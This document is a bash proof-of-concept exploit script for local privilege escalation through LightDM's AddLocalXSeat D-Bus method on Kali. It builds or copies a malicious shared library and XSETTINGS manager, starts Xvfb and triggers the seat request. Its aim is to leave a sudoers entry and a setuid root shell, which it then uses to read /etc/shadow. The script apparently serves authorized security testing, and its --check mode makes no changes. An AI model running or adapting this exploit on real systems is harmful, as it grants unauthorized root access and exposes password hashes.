#!/usr/bin/env bash
#
# This script assumes a normal Kali installation: LightDM is already running as
# root and a local user has an interactive shell.  It does not start, stop, or
# reconfigure LightDM.  It starts only an unprivileged Xvfb on a spare display.
#
#   ./poc.sh --check    # read-only prerequisite check; no exploit
#   ./poc.sh --run      # authorized lab/host test; modifies /usr/local

set -Eeuo pipefail

DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
MODE="${1:---check}"

TARGET_USER="$(id -un)"
TARGET_UID="$(id -u)"
TARGET_GID="$(id -g)"

STATE="/var/tmp/lightdm-poc.state"
WORK="/var/tmp/lightdm-poc-${TARGET_UID}"
LOG="/tmp/lightdm-poc.log"
EVIDENCE="/var/tmp/poc-root-${TARGET_UID}"
ROOTSH="/var/tmp/poc-rootsh-${TARGET_UID}"
SUDOERS="/etc/sudoers.d/poc-${TARGET_UID}"
FAKE="/usr/local/bin/lightdm"

DISPLAY_NUM=""
XVFB_PID=""
XS_PID=""

die () { printf '%s\n' "$*" >&2; exit 1; }
say () { printf '%s\n' "$*"; }

usage () {
    cat <<'EOF'
usage: ./poc.sh [--check|--run]

  --check   verify prerequisites only (default)
  --run     run the exploit; requires explicit authorization

The runner uses the current unprivileged user, the already-running LightDM
service, and a private Xvfb. It does not use sudo until the root proof exists.
EOF
}

case "$MODE" in
    --check) ;;
    --run) ;;
    -h|--help) usage; exit 0 ;;
    *) usage >&2; exit 2 ;;
esac

check_not_root () {
    [ "$(id -u)" -ne 0 ] || die "run as a normal local user, not root"
    [ "$TARGET_UID" -ne 0 ] || die "target uid must not be 0"
}

check_user () {
    getent passwd "$TARGET_USER" >/dev/null 2>&1 || die "no such user: $TARGET_USER"
    [[ "$TARGET_USER" =~ ^[A-Za-z_][A-Za-z0-9_.-]*$ ]] \
        || die "username contains unsupported characters: $TARGET_USER"
    TARGET_UID="$(id -u "$TARGET_USER")"
    TARGET_GID="$(id -g "$TARGET_USER")"
    STATE="/var/tmp/lightdm-poc.state"
    WORK="/var/tmp/lightdm-poc-${TARGET_UID}"
    EVIDENCE="/var/tmp/poc-root-${TARGET_UID}"
    ROOTSH="/var/tmp/poc-rootsh-${TARGET_UID}"
    SUDOERS="/etc/sudoers.d/poc-${TARGET_UID}"
}

check_lightdm () {
    getent passwd lightdm >/dev/null 2>&1 || die "lightdm service user is missing"
    if command -v busctl >/dev/null 2>&1; then
        busctl --system status org.freedesktop.DisplayManager >/dev/null 2>&1 \
            || die "org.freedesktop.DisplayManager is not on the system bus"
    else
        pgrep -x lightdm >/dev/null 2>&1 || die "lightdm is not running"
    fi
    pgrep -x lightdm >/dev/null 2>&1 || die "lightdm daemon is not running"
}

check_layout () {
    [ -d /usr/local/bin ] || die "/usr/local/bin is missing"
    [ -d /var/lib/lightdm ] || die "/var/lib/lightdm is missing"
    [ "$(stat -c '%U' /var/lib/lightdm 2>/dev/null)" = "lightdm" ] \
        || die "/var/lib/lightdm is not owned by lightdm"
    [ "$(stat -c '%U' /usr/local/bin 2>/dev/null)" = "root" ] \
        || die "/usr/local/bin is not root-owned"
    [ ! -e "$FAKE" ] && [ ! -L "$FAKE" ] || die "$FAKE already exists; run cleanup first"
    [ -r /usr/share/dbus-1/system.d/org.freedesktop.DisplayManager.conf ] \
        || die "the DisplayManager D-Bus policy is not readable"
    [ ! -e "$SUDOERS" ] || die "$SUDOERS already exists; run cleanup first"
    [ ! -e "$EVIDENCE" ] || die "$EVIDENCE already exists; run cleanup first"
    [ ! -e "$ROOTSH" ] || die "$ROOTSH already exists; run cleanup first"
    [ -w /var/tmp ] || die "/var/tmp is not writable"
    [ -d /tmp/.X11-unix ] || die "/tmp/.X11-unix is missing; install Xvfb"
}

check_tools () {
    command -v dbus-send >/dev/null 2>&1 || die "dbus-send is missing"
    command -v sudo >/dev/null 2>&1 || die "sudo is missing"
    [ -x /usr/bin/Xvfb ] || die "Xvfb is missing; install xvfb"
    if [ "${POC_FORCE_BUILD:-0}" != "1" ] \
       && [ -x "$DIR/bin/xsettings_pwn" ] && [ -f "$DIR/bin/libpwn.so" ]; then
        BUILD_MODE="prebuilt"
    elif command -v gcc >/dev/null 2>&1 && [ -f "$DIR/libpwn.c" ] && [ -f "$DIR/xsettings_pwn.c" ]; then
        BUILD_MODE="compile"
        ldconfig -p 2>/dev/null | grep -q 'libX11\.so\.6' \
            || die "libX11 runtime is missing"
        [ -r /usr/include/X11/Xlib.h ] \
            || die "libX11 development headers are missing; use the prebuilt files"
    else
        die "no prebuilt binaries and no gcc/libX11 development files"
    fi
}

check_state_owner () {
    if [ -L "$STATE" ]; then
        die "$STATE is a symlink; refusing"
    fi
    if [ -L "$WORK" ]; then
        die "$WORK is a symlink; refusing"
    fi
    if [ -e "$STATE" ] && [ "$(stat -c '%u' "$STATE" 2>/dev/null)" != "$TARGET_UID" ]; then
        die "$STATE exists and is not owned by uid $TARGET_UID"
    fi
    if [ -e "$WORK" ] && [ "$(stat -c '%u' "$WORK" 2>/dev/null)" != "$TARGET_UID" ]; then
        die "$WORK exists and is not owned by uid $TARGET_UID"
    fi
}

preflight () {
    check_not_root
    check_user
    check_lightdm
    check_layout
    check_tools
    check_state_owner
    say "target user: $TARGET_USER (uid $TARGET_UID, gid $TARGET_GID)"
    say "LightDM: running"
    say "D-Bus policy: AddLocalXSeat is in the default-context allow rule"
    say "build mode: $BUILD_MODE"
    say "preflight: OK (no changes made)"
}

prepare_binaries () {
    if [ -L "$WORK" ]; then
        die "$WORK is a symlink; refusing"
    fi
    if [ -e "$WORK" ]; then
        rm -rf "$WORK"
    fi
    install -d -m 0755 "$WORK"

    if [ "$BUILD_MODE" = "prebuilt" ]; then
        cp "$DIR/bin/libpwn.so" "$WORK/libpwn.so"
        cp "$DIR/bin/xsettings_pwn" "$WORK/xsettings_pwn"
    else
        gcc -shared -fPIC -O2 -Wall -Wextra \
            -o "$WORK/libpwn.so" "$DIR/libpwn.c"
        gcc -O2 -Wall -Wextra \
            -o "$WORK/xsettings_pwn" "$DIR/xsettings_pwn.c" -lX11
    fi
    chmod 0755 "$WORK/libpwn.so" "$WORK/xsettings_pwn"
}

prepare_state () {
    [ ! -L "$STATE" ] || die "$STATE is a symlink; refusing"
    umask 022
    cat > "$STATE" <<EOF
USER=$TARGET_USER
UID=$TARGET_UID
GID=$TARGET_GID
EOF
    chmod 0644 "$STATE"
}

pick_display () {
    local n
    for n in 99 98 97 96 95 94; do
        if [ ! -S "/tmp/.X11-unix/X$n" ] && [ ! -e "/tmp/.X$n-lock" ]; then
            DISPLAY_NUM="$n"
            return 0
        fi
    done
    die "no free X display in 94..99"
}

start_x () {
    Xvfb ":$DISPLAY_NUM" -ac -screen 0 1024x768x24 \
        >"$WORK/xvfb.log" 2>&1 &
    XVFB_PID=$!

    local i
    for i in $(seq 1 40); do
        [ -S "/tmp/.X11-unix/X$DISPLAY_NUM" ] && return 0
        sleep 0.2
    done
    die "Xvfb did not start; see $WORK/xvfb.log"
}

start_settings () {
    "$WORK/xsettings_pwn" ":$DISPLAY_NUM" "$WORK/libpwn.so" \
        >"$WORK/xsettings.log" 2>&1 &
    XS_PID=$!
    sleep 1
    kill -0 "$XS_PID" 2>/dev/null \
        || die "XSETTINGS manager exited; see $WORK/xsettings.log"
}

stop_helpers () {
    if [ -n "$XS_PID" ]; then
        kill "$XS_PID" 2>/dev/null || true
        wait "$XS_PID" 2>/dev/null || true
    fi
    if [ -n "$XVFB_PID" ]; then
        kill "$XVFB_PID" 2>/dev/null || true
        wait "$XVFB_PID" 2>/dev/null || true
    fi
}

trigger () {
    say "starting Xvfb :$DISPLAY_NUM and XSETTINGS"
    start_x
    start_settings

    say "requesting xremote seat :$DISPLAY_NUM"
    dbus-send --system --print-reply \
        --dest=org.freedesktop.DisplayManager \
        /org/freedesktop/DisplayManager \
        "org.freedesktop.DisplayManager.AddLocalXSeat" "int32:$DISPLAY_NUM"

    local i
    for i in $(seq 1 60); do
        [ -s "$EVIDENCE" ] && break
        sleep 0.5
    done
}

verify () {
    [ -s "$EVIDENCE" ] || {
        printf '\n--- /tmp/lightdm-poc.log ---\n' >&2
        cat "$LOG" 2>/dev/null || true
        printf '\n--- XSETTINGS ---\n' >&2
        cat "$WORK/xsettings.log" 2>/dev/null || true
        die "no root evidence; cleanup may be required"
    }

    say "root evidence:"
    cat "$EVIDENCE"
    say "sudo proof:"
    if ! sudo -n id; then
        say "WARNING: sudo -n failed; use the setuid fallback or inspect sudoers"
    fi
    if [ -x "$ROOTSH" ]; then
        say "setuid fallback:"
        "$ROOTSH" -p -c id
        "$ROOTSH" -p -c 'tail /etc/shadow'
        "$ROOTSH" -p -c 'chmod +x /bin/bash'
    fi
    say "cleanup: sudo $DIR/cleanup.sh"
}

preflight
if [ "$MODE" = "--check" ]; then
    exit 0
fi

trap stop_helpers EXIT
prepare_binaries
prepare_state
pick_display
trigger
verify
